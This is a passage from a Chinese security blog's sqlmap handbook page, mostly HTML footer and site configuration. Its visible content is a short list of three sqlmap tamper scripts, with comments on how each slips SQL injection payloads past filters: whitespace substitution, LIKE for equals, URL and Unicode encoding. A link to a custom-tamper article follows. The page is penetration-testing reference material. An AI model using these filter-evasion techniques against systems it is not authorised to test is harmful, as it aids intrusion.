<span class="line"><span>bluecoat        #用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</span></span>
<span class="line"><span>charencode                #用 url 编码一次你的 payload</span></span>
<span class="line"><span>charunicodeencode        #用 unicode 编码 payload ，只编码非编码字符</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><a href="https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html" target="_blank" rel="noreferrer">自定义tamper</a></p></div></div></main><footer class="VPDocFooter" data-v-3c2d2c68 data-v-d63a937a><!--[--><!--[--><!--[--><!--[--><div style="" class="vitepress-backTop-main" title="返回顶部" data-v-e2e532be><svg t="1720595052079" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4279" width="200" height="200" data-v-e2e532be><path d="M752.736 431.063C757.159 140.575 520.41 8.97 504.518 0.41V0l-0.45 0.205-0.41-0.205v0.41c-15.934 8.56-252.723 140.165-248.259 430.653-48.21 31.457-98.713 87.368-90.685 184.074 8.028 96.666 101.007 160.768 136.601 157.287 35.595-3.482 25.232-30.31 25.232-30.31l12.206-50.095s52.47 80.569 69.304 80.528c15.114-1.23 87-0.123 95.6 0h0.82c8.602-0.123 80.486-1.23 95.6 0 16.794 0 69.305-80.528 69.305-80.528l12.165 50.094s-10.322 26.83 25.272 30.31c35.595 3.482 128.574-60.62 136.602-157.286 8.028-96.665-42.475-152.617-90.685-184.074z m-248.669-4.26c-6.758-0.123-94.781-3.359-102.891-107.192 2.95-98.714 95.97-107.438 102.891-107.93 6.964 0.492 99.943 9.216 102.892 107.93-8.11 103.833-96.174 107.07-102.892 107.192z m-52.019 500.531c0 11.838-9.42 21.382-21.012 21.382a21.217 21.217 0 0 1-21.054-21.34V821.74c0-11.797 9.421-21.382 21.054-21.382 11.591 0 21.012 9.585 21.012 21.382v105.635z m77.333 57.222a21.504 21.504 0 0 1-21.34 21.626 21.504 21.504 0 0 1-21.34-21.626V827.474c0-11.96 9.543-21.668 21.299-21.668 11.796 0 21.38 9.708 21.38 21.668v157.082z m71.147-82.043c0 11.796-9.42 21.34-21.053 21.34a21.217 21.217 0 0 1-21.013-21.34v-75.367c0-11.755 9.421-21.299 21.013-21.299 11.632 0 21.053 9.544 21.053 21.3v75.366z" fill="#FFF" p-id="4280" data-v-e2e532be></path></svg></div><!----><!--]--><!--]--><!--]--><!--]--><div class="edit-info" data-v-d63a937a><div class="edit-link" data-v-d63a937a><a class="VPLink link vp-external-link-icon no-icon edit-link-button" href="https://github.com/arch3rPro/arch3rpro.github.io/edit/main/posts/pentest-tools/top/sqlmap/README.md" target="_blank" rel="noreferrer" data-v-d63a937a><!--[--><span class="vpi-square-pen edit-link-icon" data-v-d63a937a></span> 不妥之处，敬请雅正<!--]--></a></div><div class="last-updated" data-v-d63a937a><p class="VPLastUpdated" data-v-d63a937a data-v-3eb9dad5>最后更新于: <time datetime="2025-04-09T14:45:06.000Z" data-v-3eb9dad5></time></p></div></div><!----></footer><!--[--><!--[--><!--[--><!----><!--]--><!--]--><!--]--></div></div></div><!--[--><!--]--></div></div><footer class="VPFooter has-sidebar" data-v-a559dc28 data-v-a9fc84f8><div class="container" data-v-a9fc84f8><!----><p class="copyright" data-v-a9fc84f8>Copyright © 2019-2025 Arch3rPro's Blog | CC BY-NC 4.0 | <a href="https://beian.miit.gov.cn" target="_blank" rel="nofollow noopener" style="text-decoration: none;">京ICP备2023000451号-3</a></p></div></footer><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"about.md\":\"ehkP_iQ2\",\"ai.md\":\"W8d3aFgl\",\"appstore.md\":\"BWDAsPP1\",\"blog.md\":\"CjkDw8fI\",\"blog_2024_vitepress-blog-2.md\":\"CKq9XlBZ\",\"blog_2024_vitepress-blog.md\":\"DobIDnIN\",\"blog_2025_vitepress-markdown.md\":\"DWR2VT9d\",\"blog_2025_vitepress-style-plus.md\":\"BCb7yfHc\",\"blog_2025_vitepress-style.md\":\"ByVuSm5E\",\"download.md\":\"_sWpkuCz\",\"efficiency.md\":\"DmkfUG1R\",\"efficiency_mac.md\":\"BagwTg7K\",\"efficiency_mac_mds-stores.md\":\"DhWFJZfX\",\"efficiency_mac_needful.md\":\"DyubHZd3\",\"efficiency_mac_terminal.md\":\"DxOmOVwf\",\"efficiency_recommend.md\":\"D_orbG8x\",\"efficiency_recommend_browser.md\":\"CplO29P0\",\"efficiency_windows.md\":\"DaFni1jh\",\"efficiency_windows_keymap.md\":\"kfzgchPD\",\"efficiency_windows_terminal.md\":\"Bq6St1k2\",\"feeds-sub.md\":\"a0LJu0Ec\",\"index.md\":\"CnI8fTdc\",\"nav.md\":\"CS19ebB_\",\"pentest-tools.md\":\"DDhegX6b\",\"pentest-tools_top.md\":\"BUkXVWr9\",\"pentest-tools_top_sqlmap.md\":\"wlrUqO2B\",\"posts_template_readme.md\":\"CeBg_U-n\",\"software.md\":\"DWMrcI9K\",\"software_cherrystudio.md\":\"irjrPQI_\",\"software_cherrystudio_custom.md\":\"Bxp8QC7U\",\"software_cherrystudio_introduce.md\":\"CW4cUh5I\",\"software_cherrystudio_providers.md\":\"Bc3bYUZJ\",\"software_lobechat.md\":\"D6-t2boY\",\"software_lobechat_install.md\":\"Dud1UtSO\",\"software_lobechat_setting.md\":\"CXpA8KGW\",\"template.md\":\"Ut2TvPyc\",\"tutorial.md\":\"G0ijDawG\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"zh-CN\",\"dir\":\"ltr\",\"title\":\"矛·盾 知识库\",\"description\":\"产品经理,IT民工,网安边缘人员,乱七八糟都搞点,\",\"base\":\"/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":\"dark\",\"themeConfig\":{\"nav\":[{\"text\":\"矛盾武器库\",\"link\":\"/download/\"},{\"text\":\"应用商店\",\"link\":\"/appstore/\"},{\"text\":\"安全导航\",\"link\":\"/nav\"},{\"text\":\"AI工具箱\",\"link\":\"/ai\"},{\"text\":\"近期资讯\",\"link\":\"/feeds-sub\"},{\"text\":\"博客笔记\",\"link\":\"/blog\",\"activeMatch\":\"^/blog\"},{\"text\":\"软件推荐\",\"items\":[{\"text\":\"AI工具\",\"items\":[{\"text\":\"Cherry-Studio\",\"link\":\"/software/cherrystudio/introduce\",\"activeMatch\":\"/software/cherrystudio/\"},{\"text\":\"Lobe-Chat\",\"link\":\"/software/lobechat/install\",\"activeMatch\":\"lobechat/install/\"}]}]},{\"text\":\"工具手册\",\"items\":[{\"text\":\"常用工具\",\"items\":[{\"text\":\"SQLmap\",\"link\":\"/pentest-tools/top/sqlmap\",\"activeMatch\":\"/pentest-tools/top/\"}]}]},{\"text\":\"关于我\",\"link\":\"/about\"}],\"sidebar\":{\"/blog\":[{\"text\":\"2025年 (3篇)\",\"items\":[{\"text\":\"VitePress博客-样式美化-补充\",\"link\":\"/blog/2025/vitepress-style-plus\"},{\"text\":\"VitePress博客-样式美化\",\"link\":\"/blog/2025/vitepress-style\"},{\"text\":\"VitePress博客-Markdown基础\",\"link\":\"/blog/2025/vitepress-markdown\"}],\"collapsed\":false},{\"text\":\"2024年 (2篇)\",\"items\":[{\"text\":\"VitePress博客-主题介绍\",\"link\":\"/blog/2024/vitepress-blog\"},{\"text\":\"VitePress博客-添加热力图\",\"link\":\"/blog/2024/vitepress-blog-2\"}],\"collapsed\":true}],\"/review\":[],\"/softs\":[],\"/efficiency\":[{\"text\":\"Mac平台 (3篇)\",\"link\":\"\",\"items\":[{\"text\":\"Mac系统优化-关闭mds_stores\",\"link\":\"/efficiency/mac/mds-stores\",\"sort\":3},{\"text\":\"Terminal配置\",\"link\":\"/efficiency/mac/terminal\",\"sort\":4},{\"text\":\"其他必要的软件安装参考\",\"link\":\"/efficiency/mac/needful\",\"sort\":5}],\"collapsed\":false},{\"text\":\"Windows平台 (2篇)\",\"link\":\"\",\"items\":[{\"text\":\"键位映射神器\",\"link\":\"/efficiency/windows/keymap\"},{\"text\":\"美化Windows Terminal\",\"link\":\"/efficiency/windows/terminal\"}],\"collapsed\":false},{\"text\":\"实用软件清单 (1篇)\",\"link\":\"\",\"items\":[{\"text\":\"PC浏览器篇\",\"link\":\"/efficiency/recommend/browser\"}],\"collapsed\":false}],\"/software\":[{\"text\":\"Cherry-Studio (3篇)\",\"link\":\"\",\"items\":[{\"text\":\"1-项目简介\",\"link\":\"/software/cherrystudio/introduce\",\"sort\":1},{\"text\":\"2-服务商设置\",\"link\":\"/software/cherrystudio/providers\",\"sort\":2},{\"text\":\"3-自定义服务商\",\"link\":\"/software/cherrystudio/custom\",\"sort\":3}],\"collapsed\":false},{\"text\":\"Lobe-Chat (2篇)\",\"link\":\"\",\"items\":[{\"text\":\"1-LobeChat部署\",\"link\":\"/software/lobechat/install\",\"sort\":1},{\"text\":\"2-LobeChat设置\",\"link\":\"/software/lobechat/setting\"}],\"collapsed\":false}],\"/pentest-tools\":[{\"text\":\"常用工具 (1篇)\",\"link\":\"\",\"items\":[{\"text\":\"SQLmap简要手册\",\"link\":\"/pentest-tools/top/sqlmap\",\"sort\":1}],\"collapsed\":false}]},\"logo\":{\"light\":\"/logo.png\",\"dark\":\"/logo.png\"},\"outline\":{\"label\":\"页面导航\",\"level\":\"deep\"},\"editLink\":{\"pattern\":\"https://github.com/arch3rPro/arch3rpro.github.io/edit/main/:path\",\"text\":\"不妥之处，敬请雅正\"},\"lastUpdated\":{\"text\":\"最后更新于\",\"formatOptions\":{\"dateStyle\":\"short\",\"timeStyle\":\"medium\"}},\"docFooter\":{\"prev\":\"上一篇\",\"next\":\"下一篇\"},\"search\":{\"provider\":\"local\"},\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/arch3rPro/arch3rpro.github.io\"}],\"footer\":{\"copyright\":\"Copyright © 2019-2025 Arch3rPro's Blog | CC BY-NC 4.0 | <a href=\\\"https://beian.miit.gov.cn\\\" target=\\\"_blank\\\" rel=\\\"nofollow noopener\\\" style=\\\"text-decoration: none;\\\">京ICP备2023000451号-3</a>\"},\"articleMetadataConfig\":{\"author\":\"Arch3rPro\",\"authorLink\":\"/about\"},\"copyrightConfig\":{\"license\":\"署名-相同方式共享 4.0 国际 (CC BY-SA 4.0)\",\"licenseLink\":\"https://creativecommons.org/licenses/by/4.0/legalcode.zh-hans\"}},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":true}");</script>
    
  </body>
</html>